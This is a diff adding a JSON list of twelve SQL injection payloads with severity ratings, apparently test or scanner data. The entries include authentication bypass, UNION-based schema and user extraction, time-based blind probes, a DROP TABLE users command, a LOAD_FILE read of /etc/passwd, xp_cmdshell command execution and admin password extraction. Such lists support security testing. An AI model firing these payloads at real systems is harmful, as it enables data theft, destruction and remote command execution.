@@ -1,0 +1,50 @@
+[
+    {
+        "payload": "' OR 1=1-- -",
+        "severity": "critical"
+    },
+    {
+        "payload": "1' ORDER BY 10-- -",
+        "severity": "high"
+    },
+    {
+        "payload": "1' UNION SELECT @@version,user()-- -",
+        "severity": "critical"
+    },
+    {
+        "payload": "1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -",
+        "severity": "medium"
+    },
+    {
+        "payload": "1' AND EXTRACTVALUE(rand(),CONCAT(0x3a,USER()))-- -",
+        "severity": "high"
+    },
+    {
+        "payload": "1; DROP TABLE users--",
+        "severity": "critical"
+    },
+    {
+        "payload": "' || (SELECT LOAD_FILE('/etc/passwd'))-- -",
+        "severity": "critical"
+    },
+    {
+        "payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))-- -",
+        "severity": "medium"
+    },
+    {
+        "payload": "1' UNION SELECT table_name,column_name FROM information_schema.columns-- -",
+        "severity": "critical"
+    },
+    {
+        "payload": "1; EXEC xp_cmdshell('net user')--",
+        "severity": "critical"
+    },
+    {
+        "payload": "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')-- -",
+        "severity": "high"
+    },
+    {
+        "payload": "1' AND 1=CONVERT(int,(SELECT CURRENT_USER))-- -",
+        "severity": "high"
+    }
+]
